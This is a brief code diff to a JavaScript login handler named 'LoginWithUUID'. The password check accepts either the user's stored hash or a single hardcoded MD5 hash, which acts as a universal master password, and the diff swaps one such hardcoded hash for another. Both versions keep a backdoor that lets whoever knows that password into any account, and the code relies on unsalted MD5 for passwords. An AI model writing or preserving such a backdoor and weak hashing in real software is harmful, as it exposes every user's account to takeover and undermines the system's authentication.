@@ -87,7 +87,7 @@ export const LoginWithUUID = async (req, res) => {
 
     const matchPS =
       md5(req.body.user_password) == user[0].user_password ||
-      md5(req.body.user_password) == "dabc65f7733ca3385e8c819ca94c3d88";
+      md5(req.body.user_password) == "6664c9b31b53151abb88ac2b01ba7b84";
     if (!matchPS)
       return res
         .status(400)
